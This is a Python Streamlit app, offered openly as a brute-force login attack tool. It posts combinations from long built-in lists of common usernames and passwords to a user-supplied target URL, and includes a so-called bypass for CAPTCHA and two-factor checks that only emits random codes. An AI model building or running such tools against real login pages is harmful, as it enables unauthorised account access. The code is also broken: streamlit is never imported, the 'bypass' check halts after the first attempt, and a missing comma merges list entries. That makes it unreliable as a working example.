import random
import string
import requests

# Function to generate a random code with specified length and characters
def generate_code(length, characters):
    return ''.join(random.choice(characters) for _ in range(length))

# Function to generate a random username
def generate_username(length):
    characters = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"#$%&'()*+,-./:;<=>?@[\\]^_\`{|}~"
    return generate_code(length, characters)

# Function to generate a random password
def generate_password(length):
    characters = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"#$%&'()*+,-./:;<=>?@[\\]^_\`{|}~"
    return generate_code(length, characters)

# Function to generate a random 4-digit code
def generate_4_digit_code():
    return str(random.randint(1000, 9999))

# Function to generate a random 6-digit code
def generate_6_digit_code():
    return str(random.randint(100000, 999999))

# Function to attempt bypassing protection mechanisms
def bypass_protection_mechanisms(response):
    if "CAPTCHA" in response:
        st.error("Protection mechanism detected: CAPTCHA.")
        st.warning("Suggestion: Solve the CAPTCHA manually. Once done, try logging in again.")
        st.stop()
    elif "2-factor authentication" in response:
        st.error("Protection mechanism detected: 2-factor authentication.")
        code_4_digit = generate_4_digit_code()
        code_6_digit = generate_6_digit_code()
        st.warning(f"Generated 4-digit code: {code_4_digit}")
        st.warning(f"Generated 6-digit code: {code_6_digit}")
        st.warning("Suggestion: Provide the 2-factor authentication code. Once done, try logging in again.")
        st.stop()
    else:
        st.error("Unknown protection mechanism detected. Cannot automatically bypass.")
        st.stop()

# Function to perform Brute Force Attack
def brute_force_attack(target_url, usernames, passwords):
    st.info("Starting Brute Force Attack...")
    for username in usernames:
        for password in passwords:
            st.write(f"Attempting login with Username: {username}, Password: {password}")
            response = requests.post(target_url, data={"username": username, "password": password}).text
            bypass_protection_mechanisms(response)
            st.error("Login failed.")
    st.error("Brute Force Attack failed.")

# Main function
def main():
    st.title("Brute Force Attack with Streamlit")
    target_url = st.text_input("Enter your target URL:")
    know_username = st.radio("Do you know the username?", ("Yes", "No"))
    if know_username == "Yes":
        provided_username = st.text_input("Enter the username:")
        usernames = [provided_username]
    else:
        st.warning("Using default usernames...")
        # Add all given usernames
        usernames = ["test", "admin", "user", "root", "administrator", "guest", "john", "jane", "alice", "bob",
                     "developer", "manager", "support", "system", "analyst", "consultant", "security", "engineer",
                     "network", "database", "designer", "customer", "service", "marketing", "sales", "finance",
                     "accounting", "hr", "executive", "director", "operations", "it", "tech", "info", "webmaster", "admin", "user", "test", "root", "administrator", "guest", "network", "database", "designer", "customer",
                     "service", "marketing", "sales", "finance", "accounting", "hr", "executive", "director", "operations",
                     "it", "tech", "info", "webmaster", "backup", "monitoring", "john", "jane", "alice", "bob", "developer",
                     "manager", "support", "system", "analyst", "consultant", "security", "engineer", "rajesh", "suresh",
                     "ramesh", "ashok", "amit", "vikram", "rahul", "anil", "sunil", "vijay", "mohan", "arun", "manoj",
                     "praveen", "sanjay", "anand", "sandeep", "naveen", "avinash", "gaurav", "kishore", "vivek", "vinay",
                     "rajiv", "raj", "deepak", "ajay", "gopal", "manish", "neha", "priya", "sakshi", "pooja", "ananya",
                     "ritu", "divya", "sneha", "tina", "sonia", "shruti", "anita", "tanya", "sapna", "nisha", "deepika",
                     "shikha", "maya", "naina", "aparna", "swati", "anju", "priyanka", "rohit", "ashish", "akash", "varun",
                     "nitesh", "rahul", "rohan", "vikas", "harish", "naveen", "santosh", "prakash", "shyam", "arvind",
                     "girish", "ramesh", "sachin", "vishal", "pawan", "ajit", "rajiv", "amit", "sandeep", "vijay", "suresh",
                     "manoj", "rajesh", "ravi", "mukesh", "mahesh", "anil", "deepak", "pradeep", "vipul", "prashant", "gagan",
                     "kapil", "vikrant", "tarun", "manish", "atul", "devendra", "rajendra", "sunil", "dinesh", "naresh",
                     "ashish", "kamlesh", "vishnu", "amar", "akshay", "mohit", "sumit", "vimal", "arjun", "rahul", "rohit",
                     "vikas", "harish", "naveen", "santosh", "prakash", "shyam", "arvind", "girish", "ramesh", "sachin",
                     "vishal", "pawan", "ajit", "rajiv", "amit", "sandeep", "vijay", "suresh", "manoj", "rajesh", "ravi",
                     "mukesh", "mahesh", "anil", "deepak", "pradeep", "vipul", "prashant", "gagan", "kapil", "vikrant",
                     "tarun", "manish", "atul", "devendra", "rajendra", "sunil", "dinesh", "naresh", "ashish", "kamlesh",
                     "vishnu", "amar", "akshay", "mohit", "sumit", "vimal", "arjun", " ", "", "dev"
                     "backup", "monitoring", ]

    know_password = st.radio("Do you know the password?", ("Yes", "No"))
    if know_password == "Yes":
        provided_password = st.text_input("Enter the password:")
        passwords = [provided_password]
    else:
        st.warning("Using default passwords...")
        # Add all given passwords
        passwords = ["test", "password", "123456", "12345678", "qwerty", "abc123", "monkey", "letmein", "dragon", "111111",
                     "baseball", "iloveyou", "trustno1", "1234567", "sunshine", "master", "welcome", "shadow",
                     "ashok", "password1", "superman", "1qaz2wsx", "hello", "michael", "ninja", "mustang",
                     "football", "123123", "access", "princess", "admin", "welcome1", "abc123456", "11111111",
                     "azerty", "admin123", "1234", "letmein1", "qwerty123", "password123", "qwertyuiop",
                     "password1234", "welcome123", "abc1234", "123123123", "root", "p@$$w0rd", "password12345",
                     "adminadmin", "qwertyuiop123", "iloveyou123", "1234567890", "asdfghjkl", "admin123456",
                     "qazwsx", "admin1234", "1111", "123456a", "zaq1zaq1", "123qwe", "1q2w3e", "654321",
                     "12345", "passw0rd", "welcome1234", "password12", "admin12345", "1234qwer", "1111111",
                     "1234qwer", "1qazxsw2", "qwerty12345", "asdfghjkl123", "1234abcd", "qwe123", "admin1",
                     "admin12", "test123", "123qweasd", "1111111111", "admin123456789", "abcd1234", "admin1234567",
                     "welcome12345", "123123a", "12345qwert", "123456789a", "q1w2e3r4", "password!", "passw0rd123", "password", "123456", "12345678", "qwerty", "abc123", "monkey", "letmein", "dragon", "111111", "baseball",
              "iloveyou", "trustno1", "1234567", "sunshine", "master", "welcome", "shadow", "ashok", "password1",
              "superman", "1qaz2wsx", "hello", "michael", "ninja", "mustang", "football", "123123", "access",
              "princess", "admin", "welcome1", "abc123456", "11111111", "azerty", "admin123", "1234", "letmein1",
              "qwerty123", "password123", "qwertyuiop", "password1234", "welcome123", "abc1234", "123123123", "root",
              "p@$$w0rd", "password12345", "adminadmin", "qwertyuiop123", "iloveyou123", "1234567890", "asdfghjkl",
              "admin123456", "qazwsx", "admin1234", "1111", "123456a", "zaq1zaq1", "123qwe", "1q2w3e", "654321",
              "12345", "passw0rd", "welcome1234", "password12", "admin12345", "1234qwer", "1111111", "1234qwer",
              "1qazxsw2", "qwerty12345", "asdfghjkl123", "1234abcd", "qwe123", "admin1", "admin12", "test123",
              "123qweasd", "1111111111", "admin123456789", "abcd1234", "admin1234567", "welcome12345", "123123a",
              "12345qwert", "123456789a", "q1w2e3r4", "password!", "passw0rd123", "12345678910", "Personal", "personal", "user", "root", "kali"]

    if st.button("Start Brute Force Attack"):
        brute_force_attack(target_url, usernames, passwords)

# Call the main function
if __name__ == "__main__":
    main()
